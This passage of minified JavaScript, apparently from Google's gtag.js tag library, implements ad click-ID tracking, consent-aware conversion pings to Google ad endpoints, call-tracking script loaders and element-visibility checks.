            : d
            ? ((b = d), (c = 2))
            : f && ((b = f), (c = 3)),
          { sd: b, Rj: c }
        );
      },
      Cq = function () {
        var a = Yi(G.location.href),
          b = Si(a, "query", !1, void 0, "gad_source");
        void 0 === b && (b = Ri(a.hash.replace("#", ""), "gad_source", !1));
        return b;
      },
      Eq = function () {
        var a = 1 === en(!1) ? G.top.location.href : G.location.href;
        return a.replace(/[\?#].*$/, "");
      },
      Hq = function (a, b, c) {
        if ("aw" === a || "dc" === a || "gb" === a) {
          var d = $i("gcl" + a);
          if (d) return d.split(".");
        }
        var e = Vp(b);
        if ("_gcl" === e) {
          var g,
            f = !W(Gq()) && c;
          if ((g = eq()[a] || []).length > 0) return f ? ["0"] : g;
        }
        var k = Wp(a, e);
        return k ? Rp(k) : [];
      },
      Gq = function () {
        return [P.g.R, P.g.O];
      },
      Jq = /^(www\.)?google(\.com?)?(\.[a-z]{2}t?)?$/,
      Kq = /^www.googleadservices.com$/,
      Lq = function (a, b) {
        return Hq("aw", a, b);
      },
      Nq = function (a, b, c, d, e) {
        var r,
          t,
          f = eq(),
          g = [],
          k = c && Jn(c),
          m = f.gclid,
          n = f.dclid,
          p = f.gclsrc || "aw",
          q =
            "1" ===
            Ri(Yi(G.location.href).search.replace("?", ""), "gad", !1, !0);
        if (U(63)) {
          var u = Bq();
          (r = u.sd), (t = u.Rj);
        } else r = Cq();
        !m ||
          ("aw.ds" !== p && "aw" !== p && "ds" !== p && "3p.ds" !== p) ||
          g.push({ aa: m, Ge: p }),
          n && g.push({ aa: n, Ge: "ds" }),
          2 === g.length && O(147),
          0 === g.length && f.wbraid && g.push({ aa: f.wbraid, Ge: "gb" }),
          0 === g.length && "aw.ds" === p && g.push({ aa: "", Ge: "aw.ds" }),
          (function (a) {
            var b = Gq();
            il(function () {
              a(), W(b) || Kk(a, b);
            }, b);
          })(function () {
            var v = W(Gq());
            if (v) {
              lp(a);
              var w = [],
                x = v ? jp[mp(a.prefix)] : void 0;
              if ((x && w.push("auid=" + x), W(P.g.O))) {
                e && w.push("userId=" + e);
                var y = jo(eo.Wg);
                if (void 0 === y) io(eo.Xg, !0);
                else {
                  var B = jo(eo.ue);
                  w.push("ga_uid=" + B + "." + y);
                }
              }
              var A = H.referrer ? Si(Yi(H.referrer), "host") : "",
                C = v || !d ? g : [];
              if (
                (0 === C.length &&
                  (Jq.test(A) || Kq.test(A)) &&
                  C.push({ aa: "", Ge: "" }),
                0 !== C.length || q || void 0 !== r)
              ) {
                A && w.push("ref=" + encodeURIComponent(A));
                var E = Eq();
                w.push("url=" + encodeURIComponent(E)), w.push("tft=" + Cb());
                var D = Qc();
                void 0 !== D && w.push("tfd=" + Math.round(D));
                var F = en(!0);
                if (
                  (w.push("frm=" + F),
                  q && w.push("gad=1"),
                  void 0 !== r && w.push("gad_source=" + encodeURIComponent(r)),
                  void 0 !== t &&
                    w.push(
                      "gad_source_src=" + encodeURIComponent(t.toString())
                    ),
                  c)
                ) {
                  if (!U(77)) {
                    var M = {};
                    c = Xl(Nl(new Ml(0), ((M[P.g.ka] = k), M)));
                  }
                } else {
                  var L = {};
                  c = Xl(Nl(new Ml(0), ((L[P.g.ka] = rm.D[P.g.ka]), L)));
                }
                w.push("gtm=" + co({ xa: b })),
                  Kn() && w.push("gcs=" + Ln()),
                  w.push("gcd=" + Pn(c)),
                  Yn() && w.push("dma_cps=" + Qn()),
                  w.push("dma=" + Rn()),
                  Jn(c) ? w.push("npa=0") : w.push("npa=1"),
                  $n() && w.push("_ng=1"),
                  on(wn()) && w.push("tcfd=" + Zn());
                var R = Dn();
                R && w.push("gdpr=" + R);
                var V = Cn();
                if (
                  (V && w.push("gdpr_consent=" + V),
                  U(17) && w.push("apve=" + (U(18) ? 1 : 0)),
                  zi.j && w.push("tag_exp=" + zi.j),
                  C.length > 0)
                )
                  for (var aa = 0; aa < C.length; aa++) {
                    var X = C[aa],
                      S = X.aa,
                      na = X.Ge;
                    if (!Aq(a.prefix, na + "." + S, void 0 !== x)) {
                      var la =
                        "https://adservice.google.com/pagead/regclk?" +
                        w.join("&");
                      "" !== S
                        ? (la =
                            "gb" === na
                              ? la + "&wbraid=" + S
                              : la + "&gclid=" + S + "&gclsrc=" + na)
                        : "aw.ds" === na && (la += "&gclsrc=aw.ds"),
                        Kc(la);
                    }
                  }
                else if (
                  (q || void 0 !== r) &&
                  !Aq(a.prefix, "gad", void 0 !== x)
                ) {
                  var ha =
                    "https://adservice.google.com/pagead/regclk?" + w.join("&");
                  Kc(ha);
                }
              }
            }
          });
      };
    function Oq() {
      return hi.dedupe_gclid || (hi.dedupe_gclid = Fo()), hi.dedupe_gclid;
    }
    var Pq = /^(www\.)?google(\.com?)?(\.[a-z]{2}t?)?$/,
      Qq = /^www.googleadservices.com$/;
    function Rq(a) {
      return (
        a || (a = Sq()),
        !a.nn &&
          !!(a.Yl || a.Zl || a.bm || a.am || a.xh || a.sd || a.Ml || a.Ql)
      );
    }
    function Sq() {
      var a = {},
        b = Yo(!0);
      a.nn = !!b._up;
      var c = eq();
      (a.Yl = void 0 !== c.aw),
        (a.Zl = void 0 !== c.dc),
        (a.bm = void 0 !== c.wbraid),
        (a.am = void 0 !== c.gbraid);
      var d = Yi(G.location.href),
        e = Si(d, "query", !1, void 0, "gad");
      if (((a.xh = void 0 !== e), !a.xh)) {
        var g = Ri(d.hash.replace("#", ""), "gad", !1);
        a.xh = void 0 !== g;
      }
      if (
        ((a.sd = Si(d, "query", !1, void 0, "gad_source")), void 0 === a.sd)
      ) {
        var m = Ri(d.hash.replace("#", ""), "gad_source", !1);
        a.sd = m;
      }
      var n = H.referrer ? Si(Yi(H.referrer), "host") : "";
      return (a.Ql = Pq.test(n)), (a.Ml = Qq.test(n)), a;
    }
    var Tq = RegExp(
        "^UA-\\d+-\\d+%3A[\\w-]+(?:%2C[\\w-]+)*(?:%3BUA-\\d+-\\d+%3A[\\w-]+(?:%2C[\\w-]+)*)*$"
      ),
      Uq = /^~?[\w-]+(?:\.~?[\w-]+)*$/,
      Vq = /^\d+\.fls\.doubleclick\.net$/,
      Wq = /;gac=([^;?]+)/,
      Xq = /;gacgb=([^;?]+)/;
    function Yq(a, b) {
      if (Vq.test(H.location.host)) {
        var c = H.location.href.match(b);
        return c && 2 === c.length && c[1].match(Tq)
          ? decodeURIComponent(c[1])
          : "";
      }
      for (
        var d = [], e = ma(Object.keys(a)), f = e.next();
        !f.done;
        f = e.next()
      ) {
        for (var g = f.value, k = [], m = a[g], n = 0; n < m.length; n++)
          k.push(m[n].aa);
        d.push(g + ":" + k.join(","));
      }
      return d.length > 0 ? d.join(";") : "";
    }
    function Zq(a, b, c) {
      for (
        var d = Pp(["ad_storage", "ad_user_data"]) ? wp("_gac_gb", !0) : {},
          e = [],
          f = !1,
          g = ma(Object.keys(d)),
          k = g.next();
        !k.done;
        k = g.next()
      ) {
        var m = k.value,
          n = vq("_gac_gb_" + m, a, b, c);
        (f =
          f ||
          (0 !== n.length &&
            n.some(function (p) {
              return 1 === p;
            }))),
          e.push(m + ":" + n.join(","));
      }
      return { Ll: f ? e.join(";") : "", Kl: Yq(d, Xq) };
    }
    function $q(a) {
      var b = H.location.href.match(new RegExp(";" + a + "=([^;?]+)"));
      return b && 2 === b.length && b[1].match(Uq) ? b[1] : void 0;
    }
    function br(a, b, c) {
      if (Vq.test(H.location.host)) {
        var d = $q(c);
        if (d) return [{ aa: d }];
      } else {
        if ("gclid" === b) return Sp((a || "_gcl") + "_aw");
        if ("wbraid" === b) return Sp((a || "_gcl") + "_gb");
        if ("braids" === b) return Up({ prefix: a });
      }
      return [];
    }
    function fr(a, b) {
      return Vq.test(H.location.host)
        ? !($q("gclaw") || $q("gac"))
        : (function zq(a, b) {
            var c = Math.max(
                xq("aw", a),
                yq(Pp(["ad_storage", "ad_user_data"]) ? wp() : {})
              ),
              d = Math.max(
                xq("gb", a),
                yq(Pp(["ad_storage", "ad_user_data"]) ? wp("_gac_gb", !0) : {})
              );
            return nb(7) && b && (d = Math.max(d, xq("ag", a))), d > c;
          })(a, b);
    }
    function gr(a, b, c) {
      var d;
      return (
        (d = c
          ? (function wq(a, b) {
              var c = [],
                e = uq(c, Up((b = b || {})), a);
              if (e.length)
                for (var f = ma(e), g = f.next(); !g.done; g = f.next()) {
                  var k = g.value,
                    m = Vp(b.prefix),
                    n = Wp(k.type, m);
                  if (!n) break;
                  var p = k,
                    q = p.version,
                    r = p.aa,
                    t = p.labels,
                    u = p.timestamp,
                    v = Math.round(u / 1e3);
                  if ("ag" === k.type) {
                    var w = {};
                    Ip(
                      n,
                      ((w.k = r),
                      (w.i = "" + v),
                      (w.b = (t || []).concat([a])),
                      w),
                      b,
                      u
                    );
                  } else if ("gb" === k.type) {
                    var y = [q, v, r].concat(t || [], [a]).join("."),
                      B = Io(b, u, !0);
                    (B.Cb = ["ad_storage", "ad_user_data"]), yo(n, y, B);
                  }
                }
              return c;
            })(a, b)
          : vq(((b && b.prefix) || "_gcl") + "_gb", a, b)),
        0 === d.length ||
        d.every(function (e) {
          return 0 === e;
        })
          ? ""
          : d.join(".")
      );
    }
    function hr() {
      var a = G.__uspapi;
      if (pb(a)) {
        var b = "";
        try {
          a("getUSPData", 1, function (c, d) {
            if (d && c) {
              var e = c.uspString;
              e && RegExp("^[\\da-zA-Z-]{1,20}$").test(e) && (b = e);
            }
          });
        } catch (c) {}
        return b;
      }
    }
    var lr = function (a) {
        if (a.eventName === P.g.ba && "page_view" === a.metadata.hit_type)
          if (U(18)) {
            a.metadata.redact_click_ids =
              null != Q(a.m, P.g.fa) &&
              !1 !== Q(a.m, P.g.fa) &&
              !W([P.g.R, P.g.O]);
            var b = ir(a),
              c = !1 !== Q(a.m, P.g.ra);
            c || (a.o[P.g.Ji] = "1");
            var d = Vp(b.prefix),
              e = a.metadata.is_server_side_destination;
            if (!a.metadata.consent_updated && !a.metadata.user_id_updated) {
              var k,
                f = Q(a.m, P.g.Xa),
                g = Q(a.m, P.g.sa) || {};
              if ((jr({ rd: c, yd: g, Ed: f, jc: b }), (k = !e))) {
                var n = (hi.ads_pageview = hi.ads_pageview || {});
                k = !(!n[d] && (n[d] = !0));
              }
              if (k) return void (a.isAborted = !0);
            }
            if (e) a.isAborted = !0;
            else {
              if (((a.o[P.g.xc] = P.g.Ub), a.metadata.consent_updated))
                (a.o[P.g.xc] = P.g.Bk), (a.o[P.g.Sb] = "1");
              else if (a.metadata.user_id_updated) a.o[P.g.xc] = P.g.Gk;
              else {
                var q,
                  p = eq();
                if (
                  ((a.o[P.g.Hd] = p.gclid),
                  (a.o[P.g.Pd] = p.dclid),
                  (a.o[P.g.Ei] = p.gclsrc),
                  a.o[P.g.Hd] ||
                    a.o[P.g.Pd] ||
                    ((a.o[P.g.bf] = p.wbraid), (a.o[P.g.ig] = p.gbraid)),
                  (a.o[P.g.Da] = H.referrer ? Si(Yi(H.referrer), "host") : ""),
                  (a.o[P.g.wa] = Eq()),
                  U(21) && (a.o[P.g.cb] = kr()),
                  U(63))
                ) {
                  var r = Bq();
                  (q = r.sd), (a.o[P.g.Di] = r.Rj);
                } else q = Cq();
                (a.o[P.g.Ci] = q),
                  (a.o[P.g.Jb] = en(!0)),
                  Rq(Sq()) && (a.o[P.g.ed] = "1"),
                  (a.o[P.g.Gi] = Oq()),
                  "1" === Yo(!1)._up && (a.o[P.g.Wi] = "1");
              }
              Mk = !0;
              var u = W([P.g.R, P.g.O]);
              c && u && (lp(b), (a.o[P.g.Gb] = jp[mp(b.prefix)])),
                (a.o[P.g.nb] = void 0),
                (a.o[P.g.Va] = void 0);
              var v = U(65);
              if (a.o[P.g.Hd] || a.o[P.g.Pd] || !fr(d, v)) {
                if (!a.o[P.g.bf] && u) {
                  var x = Rp(d + "_aw");
                  x.length > 0 && (a.o[P.g.Va] = x.join("."));
                }
              } else {
                var w = v
                  ? (function Tp(a) {
                      return Up(a)
                        .filter(function (b) {
                          return b.aa;
                        })
                        .map(function (b) {
                          return b.aa;
                        });
                    })(b)
                  : Rp(d + "_gb");
                w.length > 0 && (a.o[P.g.nb] = w.join("."));
              }
              a.m.isGtmEvent && (a.m.j[P.g.ka] = rm.D[P.g.ka]),
                Jn(a.m) ? (a.o[P.g.Ob] = !1) : (a.o[P.g.Ob] = !0),
                (a.metadata.add_tag_timing = !0);
              var y = hr();
              void 0 !== y && (a.o[P.g.ie] = y || "error");
              var B = Dn();
              B && (a.o[P.g.Ac] = B);
              var A = Cn();
              A && (a.o[P.g.Dc] = A), (a.metadata.speculative = !1);
            }
          } else a.isAborted = !0;
      },
      ir = function (a) {
        var b = {
          prefix: Q(a.m, P.g.Za) || Q(a.m, P.g.Pa),
          domain: Q(a.m, P.g.Wa),
          Bb: Q(a.m, P.g.Oa),
          flags: Q(a.m, P.g.ab),
        };
        return a.m.isGtmEvent && (b.path = Q(a.m, P.g.Hb)), b;
      },
      jr = function (a) {
        var b, c, d, e;
        (b = a.rd),
          (c = a.yd),
          (d = a.Ed),
          (e = a.jc),
          b &&
            ((function hp(a, b) {
              return !1 !== a && (a || b || gp());
            })(c[P.g.Cc], !!c[P.g.W]) &&
              (iq(nr, e),
              (function kq(a) {
                var b = [];
                if ((nb(7) && b.push("ag"), 0 !== b.length)) {
                  var c = Yo(!0),
                    d = Vp(a.prefix);
                  Qp(
                    function () {
                      for (var e = 0; e < b.length; ++e) {
                        var f = Wp(b[e], d);
                        if (f) {
                          var g = c[f];
                          if (g) {
                            var k = Dp(g);
                            if (k) {
                              var n,
                                m = $p(k);
                              m || (m = Cb());
                              a: {
                                for (
                                  var p = m, q = Gp(f), r = 0;
                                  r < q.length;
                                  ++r
                                )
                                  if ($p(q[r]) > p) {
                                    n = !0;
                                    break a;
                                  }
                                n = !1;
                              }
                              if (n) break;
                              (k.i = "" + Math.round(m / 1e3)), Ip(f, k, a, m);
                            }
                          }
                        }
                      }
                    },
                    ["ad_storage"]
                  );
                }
              })(e),
              tp(e)),
            fq(e),
            oq(nr, e),
            (function pq(a) {
              var b = [],
                c = [];
              nb(7) && (b.push("ag"), c.push("gbraid")),
                0 !== b.length &&
                  Qp(
                    function () {
                      for (var d = Vp(a.prefix), e = 0; e < b.length; ++e) {
                        var f = Wp(b[e], d);
                        if (!f) break;
                        var g = Gp(f);
                        if (g.length) {
                          var k = g.sort(function (q, r) {
                              return $p(r) - $p(q);
                            })[0],
                            m = $p(k),
                            n = k.b,
                            p = {};
                          (p[c[e]] = k.k), gq(p, !0, a, m, n);
                        }
                      }
                    },
                    ["ad_storage"]
                  );
            })(e)),
          c[P.g.W] &&
            (mq(nr, c[P.g.W], c[P.g.Lb], !!c[P.g.vb], e.prefix),
            (function nq(a, b, c, d) {
              if (Array.isArray(a) && mo(G)) {
                var e = [];
                if ((nb(7) && e.push("ag"), 0 !== e.length)) {
                  var f = Vp(d),
                    g = function () {
                      for (var k = {}, m = 0; m < e.length; ++m) {
                        var n = Wp(e[m], f);
                        if (!n) return {};
                        var p = Gp(n);
                        if (p.length) {
                          var q = p.sort(function (r, t) {
                            return $p(t) - $p(r);
                          })[0];
                          k[n] = Ep(q);
                        }
                      }
                      return k;
                    };
                  Qp(
                    function () {
                      ep(g, a, b, c);
                    },
                    ["ad_storage"]
                  );
                }
              }
            })(c[P.g.W], c[P.g.Lb], !!c[P.g.vb], e.prefix),
            up(mp(e.prefix), c[P.g.W], c[P.g.Lb], !!c[P.g.vb], e),
            up("FPAU", c[P.g.W], c[P.g.Lb], !!c[P.g.vb], e)),
          d && rq(or),
          tq(or);
      },
      nr = ["aw", "dc", "gb"],
      or = ["aw", "dc", "gb", "ag"];
    function qr(a) {
      var b = Q(a.m, P.g.Kb),
        c = Q(a.m, P.g.Yb);
      b && !c
        ? (a.eventName !== P.g.ba && a.eventName !== P.g.Nc && O(131),
          (a.isAborted = !0))
        : !b && c && (O(132), (a.isAborted = !0));
    }
    function rr(a) {
      var b = W(P.g.R) ? hi.pscdl : "denied";
      null != b && (a.o[P.g.ff] = b);
    }
    function sr(a) {
      var b = en(!0);
      a.o[P.g.Jb] = b;
    }
    function tr(a) {
      $n() && (a.o[P.g.Bc] = 1);
    }
    function kr() {
      var a = H.title;
      if (void 0 === a || "" === a) return "";
      var b = function (d) {
        try {
          return decodeURIComponent(d), !0;
        } catch (e) {
          return !1;
        }
      };
      a = encodeURIComponent(a);
      for (var c = 256; c > 0 && !b(a.substring(0, c)); ) c--;
      return decodeURIComponent(a.substring(0, c));
    }
    function ur(a) {
      if (U(12)) {
        var b = Q(a.m, P.g.Oa);
        a.o[P.g.me] || (a.o[P.g.me] = {}), (a.o[P.g.me].ce = b);
      }
    }
    var wr = function (a) {
        var b = a && a[P.g.pg];
        return b && b[P.g.Fi];
      },
      yr = function (a, b) {
        var c = a && !W([P.g.R, P.g.O]);
        return b && c ? "0" : b;
      },
      Ar = function (a) {
        il(
          function () {
            function b(w) {
              var A,
                x = W([P.g.R, P.g.O]),
                y = k && x,
                B = g.prefix || "_gcl";
              hi.reported_gclid || (hi.reported_gclid = {}),
                (A = hi.reported_gclid);
              var C =
                (y ? B : "") +
                "." +
                (W(P.g.R) ? 1 : 0) +
                "." +
                (W(P.g.O) ? 1 : 0);
              if (!A[C]) {
                A[C] = !0;
                var E = {},
                  D = function (aa, X) {
                    (X || "number" == typeof X) && (E[aa] = X.toString());
                  },
                  F = "https://www.google.com";
                if (
                  (Kn() && (D("gcs", Ln()), w && D("gcu", 1)),
                  D("gcd", Pn(f)),
                  zi.j && D("tag_exp", zi.j),
                  Gk())
                ) {
                  if ((D("rnd", Oq()), (!n || (p && "aw.ds" !== p)) && x))
                    D("gclaw", Rp(B + "_aw").join("."));
                  D("url", String(G.location).split(/[?#]/)[0]),
                    D("dclid", yr(d, q)),
                    x || (F = "https://pagead2.googlesyndication.com");
                }
                if (
                  (Yn() && D("dma_cps", Qn()),
                  D("dma", Rn()),
                  D("npa", Jn(f) ? 0 : 1),
                  $n() && D("_ng", 1),
                  on(wn()) && D("tcfd", Zn()),
                  D("gdpr_consent", Cn() || ""),
                  D("gdpr", Dn() || ""),
                  "1" === Yo(!1)._up && D("gtm_up", 1),
                  D("gclid", yr(d, n)),
                  D("gclsrc", p),
                  !(
                    E.hasOwnProperty("gclid") ||
                    E.hasOwnProperty("dclid") ||
                    E.hasOwnProperty("gclaw")
                  ) &&
                    (D("gbraid", yr(d, r)),
                    !E.hasOwnProperty("gbraid") && Gk() && x))
                ) {
                  var M = Rp(B + "_gb");
                  M.length > 0 && D("gclgb", M.join("."));
                }
                D(
                  "gtm",
                  co({ xa: f.eventMetadata.source_canonical_id, Lf: !e })
                ),
                  k &&
                    W(P.g.R) &&
                    (lp(g || {}), y && D("auid", jp[mp(g.prefix)] || "")),
                  zr || (a.Pj && D("did", a.Pj)),
                  a.vh && D("gdid", a.vh),
                  a.nh && D("edid", a.nh),
                  void 0 !== a.yh && D("frm", a.yh),
                  U(17) && D("apve", U(18) ? 1 : 0);
                var V =
                  F +
                  "/pagead/landing?" +
                  Object.keys(E)
                    .map(function (aa) {
                      return aa + "=" + encodeURIComponent(E[aa]);
                    })
                    .join("&");
                Kc(V);
              }
            }
            var c = !!a.hh,
              d = !!a.zd,
              e = a.targetId,
              f = a.m,
              g = void 0 === a.jc ? {} : a.jc,
              k = void 0 === a.Pf || a.Pf,
              m = eq(),
              n = m.gclid || "",
              p = m.gclsrc,
              q = m.dclid || "",
              r = m.wbraid || "",
              t = !c && (!(!n || (p && "aw.ds" !== p)) || r),
              u = Gk();
            if (t || u)
              if (u) {
                var v = [P.g.R, P.g.O, P.g.ya];
                b(),
                  W(v) ||
                    hl(function (w) {
                      return b(!0, w.consentEventId, w.consentPriorityId);
                    }, v);
              } else b();
          },
          [P.g.R, P.g.O, P.g.ya]
        );
      },
      zr = !1;
    function Br(a, b, c, d) {
      var f,
        e = Bc();
      if (1 === e)
        a: {
          for (
            var g = si,
              k = "https://" + (g = g.toLowerCase()),
              m = "http://" + g,
              n = 1,
              p = H.getElementsByTagName("script"),
              q = 0;
            q < p.length && q < 100;
            q++
          ) {
            var r = p[q].src;
            if (r) {
              if (0 === (r = r.toLowerCase()).indexOf(m)) {
                f = 3;
                break a;
              }
              1 === n && 0 === r.indexOf(k) && (n = 2);
            }
          }
          f = n;
        }
      else f = e;
      return (2 === f || d || "http:" != G.location.protocol ? a : b) + c;
    }
    var Cr = function (a, b) {
        U(5) &&
          ((a.dma = Rn()),
          Yn() && (a.dmaCps = Qn()),
          Jn(b) ? (a.npa = "0") : (a.npa = "1"));
      },
      Er = function (a, b, c) {
        if (G[a.functionName]) return b.Lh && I(b.Lh), G[a.functionName];
        var d = Dr();
        if (((G[a.functionName] = d), a.Kf))
          for (var e = 0; e < a.Kf.length; e++) G[a.Kf[e]] = G[a.Kf[e]] || Dr();
        return (
          a.Of && void 0 === G[a.Of] && (G[a.Of] = c),
          Ac(Br("https://", "http://", a.Wh), b.Lh, b.Cm),
          d
        );
      },
      Dr = function () {
        var a = function () {
          (a.q = a.q || []), a.q.push(arguments);
        };
        return a;
      },
      Fr = {
        functionName: "_googWcmImpl",
        Of: "_googWcmAk",
        Wh: "www.gstatic.com/wcm/loader.js",
      },
      Gr = {
        functionName: "_gaPhoneImpl",
        Of: "ga_wpid",
        Wh: "www.gstatic.com/gaphone/loader.js",
      },
      Ir = {
        functionName: "_googCallTrackingImpl",
        Kf: [Gr.functionName, Fr.functionName],
        Wh:
          "www.gstatic.com/call-tracking/call-tracking_" + ("9" || "5") + ".js",
      },
      Jr = {},
      Kr = function (a, b, c, d, e) {
        if ((O(22), c)) {
          var f = Er(Fr, (e = e || {}), a),
            g = { ak: a, cl: b };
          void 0 === e.Qb && (g.autoreplace = c),
            Cr(g, d),
            f(2, e.Qb, g, c, 0, Bb(), e.options);
        }
      },
      Lr = function (a, b, c, d, e) {
        if ((O(21), b && c)) {
          e = e || {};
          for (
            var f = {
                countryNameCode: c,
                destinationNumber: b,
                retrievalTime: Bb(),
              },
              g = 0;
            g < a.length;
            g++
          ) {
            var k = a[g];
            Jr[k.id] ||
              (k && "AW" === k.prefix && !f.adData && k.ma.length >= 2
                ? ((f.adData = { ak: k.ma[sl[1]], cl: k.ma[sl[2]] }),
                  Cr(f.adData, d),
                  (Jr[k.id] = !0))
                : k &&
                  "UA" === k.prefix &&
                  !f.gaData &&
                  ((f.gaData = { gaWpid: k.ia }), (Jr[k.id] = !0)));
          }
          (f.gaData || f.adData) && Er(Ir, e)(e.Qb, f, e.options);
        }
      },
      Nr = function (a, b) {
        if (a && (a = l(a) ? pl(Ij(a)) : pl(Ij(a.id)))) {
          var c = void 0,
            d = !1,
            e = Q(b, P.g.aj);
          if (e && Array.isArray(e)) {
            c = [];
            for (var f = 0; f < e.length; f++) {
              var g = pl(e[f]);
              g &&
                (c.push(g),
                (a.id === g.id || (a.id === a.ia && a.ia === g.ia)) &&
                  (d = !0));
            }
          }
          if (!c || d) {
            var m,
              k = Q(b, P.g.Hg);
            if (k) {
              m = Array.isArray(k) ? k : [k];
              var n = Q(b, P.g.Fg),
                p = Q(b, P.g.Gg),
                q = Q(b, P.g.Ig),
                r = Q(b, P.g.Zi),
                t = n || p,
                u = 1;
              "UA" !== a.prefix || c || (u = 5);
              for (var v = 0; v < m.length; v++)
                if (v < u)
                  if (c) Lr(c, m[v], r, b, { Qb: t, options: q });
                  else if ("AW" === a.prefix && a.ma[sl[2]])
                    Kr(a.ma[sl[1]], a.ma[sl[2]], m[v], b, {
                      Qb: t,
                      options: q,
                    });
                  else if ("UA" === a.prefix) {
                    var w = a.ia,
                      x = m[v],
                      y = { Qb: t };
                    if ((O(23), x)) {
                      var B = Er(Gr, (y = y || {}), w),
                        A = {};
                      void 0 !== y.Qb ? (A.receiver = y.Qb) : (A.replace = x),
                        (A.ga_wpid = w),
                        (A.destination = x),
                        B(2, Bb(), A);
                    }
                  }
            }
          }
        }
      };
    var Vr,
      Qr = function (a) {
        var b = Pr[a.target.ia];
        if (!a.isAborted && b)
          for (
            var c = (function Or(a) {
                return {
                  getDestinationId: function () {
                    return a.target.ia;
                  },
                  getEventName: function () {
                    return a.eventName;
                  },
                  setEventName: function (b) {
                    a.eventName = b;
                  },
                  getHitData: function (b) {
                    return a.o[b];
                  },
                  setHitData: function (b, c) {
                    a.o[b] = c;
                  },
                  setHitDataIfNotDefined: function (b, c) {
                    void 0 === a.o[b] && (a.o[b] = c);
                  },
                  copyToHitData: function (b, c) {
                    a.copyToHitData(b, c);
                  },
                  getMetadata: function (b) {
                    return a.metadata[b];
                  },
                  setMetadata: function (b, c) {
                    a.metadata[b] = c;
                  },
                  isAborted: function () {
                    return a.isAborted;
                  },
                  abort: function () {
                    a.isAborted = !0;
                  },
                  getFromEventContext: function (b) {
                    return Q(a.m, b);
                  },
                  Sj: function () {
                    return a;
                  },
                  getHitKeys: function () {
                    return Object.keys(a.o);
                  },
                };
              })(a),
              d = 0;
            d < b.length;
            ++d
          ) {
            try {
              b[d](c);
            } catch (e) {
              a.isAborted = !0;
            }
            if (a.isAborted) break;
          }
      },
      Pr = {},
      Tr = function (a) {
        if (W(Sr)) {
          lp((a = a || {}), !1);
          var b = kp[mp(Vp(a.prefix))];
          if (b && !(Cb() - 1e3 * b.Gh > 18e5)) {
            var c = b.id,
              d = c.split(".");
            if (2 === d.length && !(Cb() - 1e3 * (Number(d[1]) || 0) > 864e5))
              return c;
          }
        }
      },
      Sr = P.g.R,
      Wr = !1;
    function Yr(a) {
      return (
        Wr ||
          (function Xr() {
            (Wr = !0), (Vr = Vr || {});
          })(),
        Vr[a]
      );
    }
    function $r(a) {
      if (H.hidden) return !0;
      var b = a.getBoundingClientRect();
      if (b.top === b.bottom || b.left === b.right || !G.getComputedStyle)
        return !0;
      var c = G.getComputedStyle(a, null);
      if ("hidden" === c.visibility) return !0;
      for (var d = a, e = c; d; ) {
        if ("none" === e.display) return !0;
        var f = e.opacity,
          g = e.filter;
        if (g) {
          var k = g.indexOf("opacity(");
          k >= 0 &&
            ("%" ===
              (g = g.substring(k + 8, g.indexOf(")", k))).charAt(
                g.length - 1
              ) && (g = g.substring(0, g.length - 1)),
            (f = String(Math.min(Number(g), Number(f)))));
        }
        if (void 0 !== f && Number(f) <= 0) return !0;
        (d = d.parentElement) && (e = G.getComputedStyle(d, null));
      }
      return !1;
    }
    var bs = function (a) {
        var b = as(),
          c = b.height,
          d = b.width,
          e = a.getBoundingClientRect(),
          f = e.bottom - e.top,
          g = e.right - e.left;
        return f && g
          ? (1 -
              Math.min(
                (Math.max(0 - e.left, 0) + Math.max(e.right - d, 0)) / g,
                1
              )) *
              (1 -
                Math.min(
                  (Math.max(0 - e.top, 0) + Math.max(e.bottom - c, 0)) / f,
                  1
                ))
          : 0;
      },
      as = function () {
        var c,
          d,
          a = H.body,
          b = H.documentElement || (a && a.parentElement);
        if (H.compatMode && "BackCompat" !== H.compatMode)
          (c = b ? b.clientHeight : 0), (d = b ? b.clientWidth : 0);
        else {
          var e = function (f, g) {
            return f && g ? Math.min(f, g) : Math.max(f, g);
          };
          (c = e(b ? b.clientHeight : 0, a ? a.clientHeight : 0)),
            (d = e(b ? b.clientWidth : 0, a ? a.clientWidth : 0));
        }
        return { width: d, height: c };
      },
      es = function (a) {
        var b;
        cs
          ? a >= 0 &&
            a < ds.length &&
            ds[a] &&
            (null == (b = ds[a]) || b.disconnect(), (ds[a] = void 0))
          : G.clearInterval(a);
      },
      fs = function (a, b, c) {
        function d(k, m) {
          var n = { top: 0, bottom: 0, right: 0, left: 0, width: 0, height: 0 },
            p = {
              boundingClientRect: k.getBoundingClientRect(),
              intersectionRatio: m,
              intersectionRect: n,
              isIntersecting: m > 0,
              rootBounds: n,
              target: k,
              time: Cb(),
            };
          I(function () {
            a(p);
          });
        }
        for (var e = [], f = [], g = 0; g < b.length; g++)
          e.push(0), f.push(-1);
        return (
          c.sort(function (k, m) {
            return k - m;
          }),
          function () {
            for (var k = 0; k < b.length; k++) {
              var m = bs(b[k]);
              if (m > e[k])
                for (; f[k] < c.length - 1 && m >= c[f[k] + 1]; )
                  d(b[k], m), f[k]++;
              else if (m < e[k])
                for (; f[k] >= 0 && m <= c[f[k]]; ) d(b[k], m), f[k]--;
              e[k] = m;
            }
          }
        );
      },
      gs = function (a, b, c) {
        for (
          var d = new G.IntersectionObserver(a, { threshold: c }), e = 0;
          e < b.length;
          e++
        )
          d.observe(b[e]);
        for (var f = 0; f < ds.length; f++) if (!ds[f]) return (ds[f] = d), f;
        return ds.push(d) - 1;
      },
      ds = [],
      cs = !(!G.IntersectionObserver || !G.IntersectionObserverEntry),
      js = function (a) {
        return (
          a.tagName + ":" + a.isVisible + ":" + a.X.length + ":" + is.test(a.X)
        );
      },
      qs = function (a, b, c) {
        return (function (a, b, c) {
          var d = a.element,
            e = { X: a.X, type: a.qa, tagName: d.tagName };
          return b && (e.querySelector = ys(d)), c && (e.isVisible = !$r(d)), e;
        })({ element: a.element, X: a.X, qa: vs.nc }, b, c);
      },
      ks = function (a) {
        var b = !(null == a || !a.wd) + "." + !(null == a || !a.xd);
        return (
          a && a.De && a.De.length && (b += "." + a.De.join(".")),
          a &&
            a.yb &&
            (b += "." + a.yb.email + "." + a.yb.phone + "." + a.yb.address),
          b
        );
      },
      ps = function (a) {
        var b;
        if (0 !== a.length)
          return (
            (b = zs(a, function (c) {
              return !As.test(c.X);
            })),
            (b = zs(b, function (c) {
              return "INPUT" === c.element.tagName.toUpperCase();
            })),
            (b = zs(b, function (c) {
              return !$r(c.element);
            }))[0]
          );
      },
      os = function (a, b) {
        if (!b || 0 === b.length) return a;
        for (var c = [], d = 0; d < a.length; d++) {
          for (var e = !0, f = 0; f < b.length; f++) {
            var g = b[f];
